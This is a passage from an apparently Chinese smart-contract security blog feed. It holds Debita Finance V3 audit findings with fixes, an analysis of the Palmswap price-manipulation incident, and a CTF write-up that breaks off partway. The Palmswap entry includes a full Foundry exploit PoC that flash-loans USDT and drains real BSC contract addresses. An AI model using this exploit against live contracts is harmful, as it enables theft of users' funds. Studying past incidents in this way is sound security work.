class="line">        ownershipContract.ownerOf(offer.lenderID) == msg.sender, </span><br><span class="line">        &quot;Not lender&quot; </span><br><span class="line">    ); </span><br><span class="line">    require(offer.paid == true, &quot;Not paid&quot;); </span><br><span class="line">    require(offer.debtClaimed == false, &quot;Already claimed&quot;); </span><br><span class="line">    loanData._acceptedOffers[index].debtClaimed = true; </span><br><span class="line">    ownershipContract.burn(offer.lenderID); </span><br><span class="line">    uint interest = offer.interestToClaim; </span><br><span class="line">    offer.interestToClaim = 0; </span><br><span class="line"> </span><br><span class="line">    SafeERC20.safeTransfer( </span><br><span class="line">        IERC20(offer.principle), </span><br><span class="line">        msg.sender, </span><br><span class="line">        interest + offer.principleAmount </span><br><span class="line">    ); </span><br><span class="line"> </span><br><span class="line">    Aggregator(AggregatorContract).emitLoanUpdated(address(this)); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>There still needs to be a check for the lender, as this would also serve as an additional layer of protection.</p><h2 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-3"><a href="#Impact-3" class="headerlink" title="Impact"></a>Impact</h2><p>This could lead to the interest being incorrectly claimed.</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-3"><a href="#Mitigation-3" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check for the lender, as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimInterest(uint index) internal &#123;</span><br><span class="line">       IOwnerships ownershipContract = IOwnerships(s_OwnershipContract);</span><br><span class="line">       infoOfOffers memory offer = loanData._acceptedOffers[index];</span><br><span class="line">       uint interest = offer.interestToClaim;</span><br><span class="line"></span><br><span class="line">         require(</span><br><span class="line">           ownershipContract.ownerOf(offer.lenderID) == msg.sender,</span><br><span class="line">           &quot;Not lender&quot;</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       require(interest &gt; 0, &quot;No interest to claim&quot;);</span><br><span class="line"></span><br><span class="line">       loanData._acceptedOffers[index].interestToClaim = 0;</span><br><span class="line">       SafeERC20.safeTransfer(IERC20(offer.principle), msg.sender, interest);</span><br><span class="line">       Aggregator(AggregatorContract).emitLoanUpdated(address(this));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="五"><a href="#五" class="headerlink" title="五"></a>五</h1><h2 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h2><p>In the payDebt function of the DebitaV3Loan.sol contract, after calculating the interest, the safe transfer does not ensure that the address receiving the interest is not the zero address.</p><h2 id="Root-Cause-4"><a href="#Root-Cause-4" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 243 to 248 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SafeERC20.safeTransferFrom( </span><br><span class="line">    IERC20(offer.principle), </span><br><span class="line">    msg.sender, </span><br><span class="line">    feeAddress, </span><br><span class="line">    feeOnInterest </span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>As we can see from above, the safe transfer function of ERC20 is used, but it cannot ensure that feeOnInterest is not transferred to the zero address, resulting in irretrievable loss.</p><h2 id="Internal-pre-conditions-3"><a href="#Internal-pre-conditions-3" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><h2 id="External-pre-conditions-4"><a href="#External-pre-conditions-4" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><h2 id="Attack-Path-4"><a href="#Attack-Path-4" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-4"><a href="#Impact-4" class="headerlink" title="Impact"></a>Impact</h2><p>The DebitaV3Loan.sol contract will lose the earned interest, which is a very unfortunate situation.</p><h2 id="PoC-4"><a href="#PoC-4" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-4"><a href="#Mitigation-4" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Perform a zero address check on feeAddress as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Check if feeAddress is the zero address</span><br><span class="line">  require(feeAddress != address(0), &quot;Invalid fee address: zero address&quot;);</span><br><span class="line"></span><br><span class="line">SafeERC20.safeTransferFrom(</span><br><span class="line">    IERC20(offer.principle),</span><br><span class="line">    msg.sender,</span><br><span class="line">    feeAddress,</span><br><span class="line">    feeOnInterest</span><br><span class="line">);\</span><br></pre></td></tr></table></figure><h1 id="六"><a href="#六" class="headerlink" title="六"></a>六</h1><h2 id="Summary-5"><a href="#Summary-5" class="headerlink" title="Summary"></a>Summary</h2><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaBorrowOffer-Factory.sol</p><p>Lines 143 to 144 in 8d0c8c0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint balance = IERC20(_collateral).balanceOf(address(borrowOffer)); </span><br><span class="line">require(balance &gt;= _collateralAmount, &quot;Invalid balance&quot;); </span><br></pre></td></tr></table></figure><p>In thecontract, it checks whether the balance of an IERC20 token has successfully met the required amount, but it does not check the balance of an IERC721 token. If the user uses an IERC721 token as collateral, this check will fail, and it is also uncertain whether the IERC721 token has successfully entered the contract.DebitaBorrowOffer-Factory.sol<br>Root Cause<br>It only checks if the collateral staked by the user is an IERC20 token, and confirms whether the DebitaBorrowOffer-Factory.sol contract has enough IERC20 tokens.<br>This is an incorrect check, as if _collateral is an IERC721 token, this check will cause the contract to fail.</p><h2 id="Internal-pre-conditions-4"><a href="#Internal-pre-conditions-4" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-5"><a href="#External-pre-conditions-5" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-5"><a href="#Attack-Path-5" class="headerlink" title="Attack Path"></a>Attack Path</h2><h2 id="Impact-5"><a href="#Impact-5" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker could use an IERC721 token as collateral. When the attacker takes out a loan and deposits the IERC721 token as collateral, it will cause the transaction to fail. If the attacker repeatedly executes the same transaction, it could potentially cause the contract to become unresponsive.</p><p>A legitimate user attempting to use an IERC721 token as collateral for a loan will also encounter an error, preventing the transaction from being processed, which would break the functionality of the contract.</p><p>An attacker can use an IERC721 token as collateral without successfully transferring it to the contract, effectively enabling them to borrow funds without providing any actual collateral.</p><h2 id="PoC-5"><a href="#PoC-5" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-5"><a href="#Mitigation-5" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>To enhance the contract’s validation functionality, it should not only check if the IERC20 collateral has been successfully deposited into the DebitaBorrowOffer-Factory.sol contract, but also account for the case where the collateral is an IERC721 token. Below is the suggested modified code:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_isNFT) &#123;</span><br><span class="line">    address nftOwner = IERC721(_collateral).ownerOf(_receiptID);</span><br><span class="line">    require(nftOwner == address(borrowOffer), &quot;NFT not transferred correctly&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    uint balance = IERC20(_collateral).balanceOf(address(borrowOffer));</span><br><span class="line">    require(balance &gt;= _collateralAmount, &quot;Invalid balance&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>感觉还是很难。就是发现不了他们的错误。这个合约的逻辑很缜密，所以只有等正确的审计报告出来，然后再多学习学习</p><h2 id="这次的审计，有让我学会一些东西，在函数中定义重复owner-会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner"><a href="#这次的审计，有让我学会一些东西，在函数中定义重复owner-会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner" class="headerlink" title="这次的审计，有让我学会一些东西，在函数中定义重复owner,会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner;"></a>这次的审计，有让我学会一些东西，在函数中定义重复owner,会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner;</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function changeOwner(address owner) public &#123;</span><br><span class="line">      require(msg.sender == owner, &quot;Only owner&quot;);</span><br><span class="line">      require(deployedTime + 6 hours &gt; block.timestamp, &quot;6 hours passed&quot;);</span><br><span class="line">      owner = owner;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当你像改变合约的owner时，由于传递的参数和合约的状态变量owner一样，所以就是自己赋值<br>这里的 owner 参数与状态变量 owner 同名，这就导致了一个作用域的问题。<br>在 Solidity 中，函数参数的作用域优先于状态变量，这意味着在函数内部，owner 会首先指代函数的参数 address owner，而不是合约的状态变量 owner。<br>因此，owner &#x3D; owner; 只是将函数的参数 owner 赋值给它自己，并没有对链上的状态变量 owner 做任何修改。<br>详细解释<br>函数参数优先级： 当你在函数中定义一个与状态变量同名的参数时，函数会优先使用该参数，而不是状态变量。也就是说，在函数内部，owner 这个名字指代的是参数 address owner，而不是链上的状态变量。<br>赋值的行为：<br>owner &#x3D; owner; 这行代码看似是给状态变量 owner 赋值，但实际上它只是给函数参数 owner 赋值。由于函数参数和状态变量是不同的存储位置，这行代码并没有实际改变链上的状态变量。<br>在 Solidity 中，owner &#x3D; owner; 是一个 自我赋值，没有任何效果，除非你在这个赋值中显式地引用状态变量。</p><blockquote><p>状态变量（State Variables）：状态变量存储在区块链上，生命周期与合约相同，可以在整个合约中访问和修改。<br>函数参数（Function Arguments）：这些变量仅在函数执行期间有效，当函数执行完后，它们就不再存在。<br>局部变量（Local Variables）：在函数内部声明的变量，它们只在函数的执行期间有效。</p></blockquote><h2 id="可以通过执行存款，阻止借贷订单的取消"><a href="#可以通过执行存款，阻止借贷订单的取消" class="headerlink" title="可以通过执行存款，阻止借贷订单的取消"></a>可以通过执行存款，阻止借贷订单的取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addFunds(uint amount) public nonReentrant &#123;  </span><br><span class="line">       require(  </span><br><span class="line">           msg.sender == lendInformation.owner ||  </span><br><span class="line">               IAggregator(aggregatorContract).isSenderALoan(msg.sender),  </span><br><span class="line">           &quot;Only owner or loan&quot;  </span><br><span class="line">       );  </span><br><span class="line">       SafeERC20.safeTransferFrom(  </span><br><span class="line">           IERC20(lendInformation.principle),  </span><br><span class="line">           msg.sender,  </span><br><span class="line">           address(this),  </span><br><span class="line">           amount  </span><br><span class="line">       );  </span><br><span class="line">       lendInformation.availableAmount += amount;  </span><br><span class="line">       IDLOFactory(factoryContract).emitUpdate(address(this));  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cancelOffer() public onlyOwner nonReentrant &#123;  </span><br><span class="line">        uint availableAmount = lendInformation.availableAmount;  </span><br><span class="line">        lendInformation.perpetual = false;  </span><br><span class="line">        lendInformation.availableAmount = 0;  </span><br><span class="line">@&gt;        require(availableAmount &gt; 0, &quot;No funds to cancel&quot;);  </span><br><span class="line">        isActive = false;  </span><br><span class="line">  </span><br><span class="line">        SafeERC20.safeTransfer(  </span><br><span class="line">            IERC20(lendInformation.principle),  </span><br><span class="line">            msg.sender,  </span><br><span class="line">            availableAmount  </span><br><span class="line">        );  </span><br><span class="line">        IDLOFactory(factoryContract).emitDelete(address(this));  </span><br><span class="line">@&gt;        IDLOFactory(factoryContract).deleteOrder(address(this));  </span><br><span class="line">        // emit canceled event on factory  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function deleteOrder(address _lendOrder) external onlyLendOrder &#123;  </span><br><span class="line">        uint index = LendOrderIndex[_lendOrder];  </span><br><span class="line">        LendOrderIndex[_lendOrder] = 0;  </span><br><span class="line">  </span><br><span class="line">        // switch index of the last borrow order to the deleted borrow order  </span><br><span class="line">        allActiveLendOrders[index] = allActiveLendOrders[activeOrdersCount - 1];  </span><br><span class="line">        LendOrderIndex[allActiveLendOrders[activeOrdersCount - 1]] = index;  </span><br><span class="line">  </span><br><span class="line">        // take out last borrow order  </span><br><span class="line">  </span><br><span class="line">        allActiveLendOrders[activeOrdersCount - 1] = address(0);  </span><br><span class="line">  </span><br><span class="line">@&gt;        activeOrdersCount--;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>攻击者可以利用 addFunds 函数中缺失的活跃订单检查，向一个 非活跃的借贷订单 中添加资金。这样，攻击者可以通过以下步骤触发攻击：</p><p>攻击者创建一个借贷订单，并通过 DLOFactory::activeOrdersCount 增加活跃订单计数。<br>攻击者调用 cancelOffer 函数取消该借贷订单，并调用 deleteOrder 减少活跃订单计数。<br>然后，攻击者向该已取消的借贷订单中添加资金，成功绕过了 cancelOffer 中的检查，允许 addFunds 通过。<br>攻击者继续调用 cancelOffer，进一步将活跃订单计数减少。<br>最终，攻击者将 DLOFactory::activeOrdersCount 计数降为 0。<br>当 activeOrdersCount 为零时，后续调用 deleteOrder 或相关函数将因为算术下溢（underflow）而失败，导致后续功能无法正常执行。<br>根本原因<br>问题出在 DLOImplementation::addFunds 函数中，它没有检查订单是否处于活跃状态。正常情况下，只有活跃订单才能向其中添加资金。但是，由于缺少这一检查，攻击者可以向一个已经取消的订单中添加资金，从而绕过订单取消的逻辑。<br>这个漏洞就是需要结合逻辑一起看，看它的检查条件，能不能绕过然后发生攻击，这次主要看合约的实现漏洞了，没有发现逻辑上可以绕过的点</p><h2 id="没有统一单位（10-18-10-8）往往会出现计算错误"><a href="#没有统一单位（10-18-10-8）往往会出现计算错误" class="headerlink" title="没有统一单位（10^18,10^8）往往会出现计算错误"></a>没有统一单位（10^18,10^8）往往会出现计算错误</h2><h2 id="下溢的问题"><a href="#下溢的问题" class="headerlink" title="下溢的问题"></a>下溢的问题</h2><p>好遗憾，最开始的时候还注意了这个地方，但是想到solidity 8.0 之后会检查溢出的，就没有太注意，但是其实是有一个报错返回的，那么就可以使DOS攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 alreadyUsedTime = block.timestamp - loanStartedAt;</span><br><span class="line">uint256 extendedTime = maxDeadline - alreadyUsedTime - block.timestamp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alreadyUsedTime = currentTime - loanStartedAt = 1705190400 - 1704067200 = 1,123,200（大约13天）</span><br><span class="line">extendedTime = maxDeadline - alreadyUsedTime - currentTime = 1705276800 - 1,123,200 - 1705190400</span><br><span class="line">             = 1705276800 - 1706313600</span><br><span class="line">             = -1,036,800</span><br></pre></td></tr></table></figure><p>这个 extendedTime 变量并没有被实际使用，但它会影响合约中的计算，导致算术下溢错误。在某些情况下，借款人即使满足所有其他扩展条件，仍然无法扩展贷款。<br>其实就是就是影响了用户的体验</p><h2 id="跳过白名单，直接阻断了后续的领取代币"><a href="#跳过白名单，直接阻断了后续的领取代币" class="headerlink" title="跳过白名单，直接阻断了后续的领取代币"></a>跳过白名单，直接阻断了后续的领取代币</h2><p>这个函数也是我反复看的，但是差点，没有发现如果直接return的话，那么就会导致后面满足白名单的人不能够领取奖励，又是一个遗憾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function updateFunds(  </span><br><span class="line">    infoOfOffers[] memory informationOffers,  </span><br><span class="line">    address collateral,  </span><br><span class="line">    address[] memory lenders,  </span><br><span class="line">    address borrower  </span><br><span class="line">) public onlyAggregator &#123;  </span><br><span class="line">    for (uint i = 0; i &lt; lenders.length; i++) &#123;  </span><br><span class="line">        bool validPair = isPairWhitelisted[informationOffers[i].principle][  </span><br><span class="line">            collateral  </span><br><span class="line">        ];  </span><br><span class="line">        if (!validPair) &#123;  </span><br><span class="line">            return;  // 这里的return导致函数提前退出，跳过后续有效的配对</span><br><span class="line">        &#125;  </span><br><span class="line">        address principle = informationOffers[i].principle;  </span><br><span class="line">        uint _currentEpoch = currentEpoch();  </span><br><span class="line">        lentAmountPerUserPerEpoch[lenders[i]][  </span><br><span class="line">            hashVariables(principle, _currentEpoch)  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        totalUsedTokenPerEpoch[principle][  </span><br><span class="line">            _currentEpoch  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        borrowAmountPerEpoch[borrower][  </span><br><span class="line">            hashVariables(principle, _currentEpoch)  </span><br><span class="line">        ] += informationOffers[i].principleAmount;  </span><br><span class="line">        emit UpdatedFunds(  </span><br><span class="line">            lenders[i],  </span><br><span class="line">            principle,  </span><br><span class="line">            collateral,  </span><br><span class="line">            borrower,  </span><br><span class="line">            _currentEpoch  </span><br><span class="line">        );  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"><a href="#FOT代币，在转账的时候会产生手续费，就会导致一些计算失败" class="headerlink" title="FOT代币，在转账的时候会产生手续费，就会导致一些计算失败"></a>FOT代币，在转账的时候会产生手续费，就会导致一些计算失败</h2><p>在 TaxTokensReceipt 合约中，存在一个问题，导致 Fee-on-Transfer (FOT) 代币在存款时出现交易回滚。问题的根本原因是合约假设用户存入的代币数量与转账的实际数量相同，但对于 Fee-on-Transfer 代币，转账过程中会扣除一定的费用。因此，合约在检查代币差额时，总是期望接收到与用户指定数量相等的金额，但实际收到的数量较少，导致存款失败。<br>Fee-on-Transfer (FOT) 代币：这类代币在每次转账时会自动扣除一定比例的费用，导致转账到合约的实际金额（difference）少于用户指定的存款金额（amount）。<br>问题发生的位置：在 TaxTokensReceipt.sol 合约的 deposit() 函数中，合约将转账前后的余额差（difference）与用户指定的 amount 进行比较，假设两者应当相等。然而，由于 FOT 代币的费用机制，实际转账的金额始终少于用户指定的 amount，因此 difference &gt;&#x3D; amount 检查始终失败，导致交易回滚。</p><p>又是一个新的知识，FOT代币，会有手续费</p><h2 id="预言机没有检查时间过时，导致价格更新不一致"><a href="#预言机没有检查时间过时，导致价格更新不一致" class="headerlink" title="预言机没有检查时间过时，导致价格更新不一致"></a>预言机没有检查时间过时，导致价格更新不一致</h2><p>DebitaChainlink.sol 合约中的 getThePrice() 函数对 Chainlink 价格预言机的数据进行验证时，存在验证不完整的问题。虽然函数进行了一些基本的检查（如合约是否暂停、价格预言机是否存在、L2序列器是否正常等），但它缺少对价格更新时间戳、回合完整性以及回合排序的验证。这意味着，即使价格预言机的数据已经过时（但价格仍大于零），合约仍然会接受这些数据，可能导致使用陈旧或无效的价格。</p><p>根本原因：<br>getThePrice() 函数目前只验证了以下几点：</p><p>合约是否暂停（isPaused）。<br>价格预言机是否存在。<br>L2序列器是否正常（对于L2链）。<br>返回的价格是否大于零。<br>然而，它没有验证：</p><p>价格更新的时间戳（updatedAt）。<br>回合是否完整（answeredInRound）。<br>回合是否按顺序回答（answeredInRound &gt;&#x3D; roundId）。<br>合约中的 getThePrice() 函数从 Chainlink 价格预言机获取最新价格数据时，验证逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(, int price, , , ) = priceFeed.latestRoundData();  </span><br><span class="line">require(isFeedAvailable[_priceFeed], &quot;Price feed not available&quot;);  </span><br><span class="line">require(price &gt; 0, &quot;Invalid price&quot;);  </span><br></pre></td></tr></table></figure><p>但没有进一步验证价格是否来自一个有效的回合，或者回合是否完整。也没有检查 updatedAt 时间戳，可能导致使用陈旧的价格数据。具体来说，以下情况未被考虑：</p><p>时间戳验证缺失： 如果预言机数据的更新时间戳很久之前，那么这个价格数据就是“过时”的，应该拒绝使用。<br>回合完整性检查： 如果价格数据属于一个不完整的回合（例如，数据没有完全更新），则无法保证其准确性。<br>回合顺序验证： 需要确保返回的回合数据是按顺序的，否则有可能是过时的无效数据。</p><p>使用预言机的话，就要注意到这几个细节<br>配置更新时间阈值： 为了应对不同的市场环境，可以让合约所有者设置一个自定义的价格数据有效时间（比如，10分钟或者更短）。<br>价格验证事件： 在每次价格验证时，触发事件记录价格数据的验证状态，这有助于监控和审计价格来源的健康状态。<br>公开数据接口： 提供一个视图函数，返回包括时间戳和回合 ID 在内的完整价格数据，供外部用户验证和分析。<br>时间戳验证缺失： 如果预言机数据的更新时间戳很久之前，那么这个价格数据就是“过时”的，应该拒绝使用。<br>回合完整性检查： 如果价格数据属于一个不完整的回合（例如，数据没有完全更新），则无法保证其准确性。<br>回合顺序验证： 需要确保返回的回合数据是按顺序的，否则有可能是过时的无效数据。</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Palmswap攻击事件的分析</title>
      <link href="/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/23/Palmswap%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K</p><h2 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h2><p>我们通过phalcon来分析。</p><p>通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的USTD。最后卖出USDP,大约得到1,947,570的USDT。</p><p>显然，攻击者在通过购买USDP操纵了PLP的价格。</p><p> function getPrice(bool _maximise) external view returns (uint256) {<br>        uint256 aum &#x3D; getAum(_maximise);<br>        uint256 supply &#x3D; IERC20Upgradeable(plp).totalSupply();<br>        return (aum * PLP_PRECISION) &#x2F; supply;<br>    }</p><pre><code>function getAums() public view returns (uint256[] memory) &#123;    uint256[] memory amounts = new uint256[](2);    amounts[0] = getAum(true);    amounts[1] = getAum(false);    return amounts;&#125;function getAumInUsdp(bool maximise)    public    view    override    returns (uint256)&#123;    uint256 aum = getAum(maximise);    return (aum * (10**USDP_DECIMALS)) / PRICE_PRECISION;&#125;function getAum(bool maximise) public view returns (uint256) &#123;    uint256 length = vault.allWhitelistedTokensLength();    uint256 aum = aumAddition;    IVault _vault = vault;    uint256 collateralTokenPrice = maximise        ? _vault.getMaxPrice(collateralToken)        : _vault.getMinPrice(collateralToken);    uint256 collateralDecimals = _vault.tokenDecimals(collateralToken);    uint256 currentAmmDeduction = (vault.permanentPoolAmount() *        collateralTokenPrice) / (10**collateralDecimals);    aum +=        (vault.poolAmount() * collateralTokenPrice) /        (10**collateralDecimals);    .......</code></pre><p>很明显攻击者通过买USDP来使Price增大。然后通过移除流动性获利。</p><p>POC<br>pragma solidity ^0.8.10;</p><p>import “forge-std&#x2F;Test.sol”;<br>import “.&#x2F;interface.sol”;</p><p>&#x2F;&#x2F; Vulnerable Contract : <a href="https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1">https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1</a><br>&#x2F;&#x2F; Attack Tx : <a href="https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9">https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9</a></p><p>interface IVault {<br>    function buyUSDP(address _receiver) external returns (uint256);</p><pre><code>function sellUSDP(address _receiver) external returns (uint256);</code></pre><p>}</p><p>interface ILiquidityEvent {<br>    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);</p><pre><code>function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);</code></pre><p>}</p><p>contract PalmswapTest is Test {<br>    IERC20 BUSDT &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);<br>    IERC20 PLP &#x3D; IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);<br>    IERC20 USDP &#x3D; IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);<br>    IVault Vault &#x3D; IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);<br>    ILiquidityEvent LiquidityEvent &#x3D; ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);<br>    IAaveFlashloan RadiantLP &#x3D; IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);<br>    address private constant plpManager &#x3D; 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;<br>    address private constant fPLP &#x3D; 0x305496cecCe61491794a4c36D322b42Bb81da9c4;</p><pre><code>CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);function setUp() public &#123;    cheats.createSelectFork(&quot;bsc&quot;, 30_248_637);    cheats.label(address(BUSDT), &quot;BUSDT&quot;);    cheats.label(address(PLP), &quot;PLP&quot;);    cheats.label(address(USDP), &quot;USDP&quot;);    cheats.label(address(Vault), &quot;Vault&quot;);    cheats.label(address(LiquidityEvent), &quot;LiquidityEvent&quot;);    cheats.label(address(RadiantLP), &quot;RadiantLP&quot;);    cheats.label(plpManager, &quot;plpManager&quot;);    cheats.label(fPLP, &quot;fPLP&quot;);&#125;  function testExploit() public &#123;    deal(address(BUSDT), address(this), 0);    BUSDT.approve(plpManager, type(uint256).max);    BUSDT.approve(address(RadiantLP), type(uint256).max);    PLP.approve(fPLP, type(uint256).max);    takeFlashLoanOnRadiant();&#125;function executeOperation(    address[] calldata assets,    uint256[] calldata amounts,    uint256[] calldata premiums,    address initiator,    bytes calldata params) external returns (bool) &#123;       uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);    BUSDT.transfer(address(Vault), 2_000_000 * 1e18);    Vault.buyUSDP(address(this));        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));    USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);    Vault.sellUSDP(address(this));    return true;&#125;function takeFlashLoanOnRadiant() internal &#123;    address[] memory assets = new address[](1);    assets[0] = address(BUSDT);    uint256[] memory amounts = new uint256[](1);    amounts[0] = 3_000_000 * 1e18;    uint256[] memory modes = new uint256[](1);    modes[0] = 0;    RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(&quot;&quot;), 0);&#125;</code></pre><p>}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Factorial</title>
      <link href="/2024/11/21/CTF-Factorial/"/>
      <url>/2024/11/21/CTF-Factorial/</url>
      
        <content type="html"><![CDATA[<p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Factorial &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function run(uint256 number) internal view returns (uint256) &#123;</span><br><span class="line">        uint256 res = 1;</span><br><span class="line">        for (uint256 index = 0; index &lt; number; index++) &#123;</span><br><span class="line">            (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature(&quot;factorial(uint256)&quot;, number));</span><br><span class="line">            res = res * abi.decode(data, (uint256));</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve() public &#123;</span><br><span class="line">        require(run(5) == 120, &quot;wrong&quot;);</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，就是五次返回值的乘积要为120，又了解到一个新知识，冷地址和新地址</p><blockquote><p>热地址（Hot Address）：在 EVM 中，”热” 地址通常指的是近期被频繁访问过的地址或合约。这些地址的数据和代码可能已经被加载到 EVM 的缓存中，因此访问这些地址会更快，消耗的 gas 较少。<br>冷地址（Cold Address）：冷地址通常指的是很少被访问的地址，或者是很久没有与之交互的合约地址。当你访问这些冷地址时，由于 EVM 可能需要重新加载代码和数据，导致访问时的 gas 消耗更高。<br>然后就可以先使用热地址，返回120，接下来再使用冷地址返回1，这样他们的乘积就能返回120了</p></blockquote><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IFactorial &#123;</span><br><span class="line">    function solve() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    IFactorial level;</span><br><span class="line"></span><br><span class="line">    // construct() &#123;&#125; // construct not allowed</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // write code here</span><br><span class="line">        address target = 0x1963ead4de36524e8EB53B88ccf79ff15Fe20baB;</span><br><span class="line">       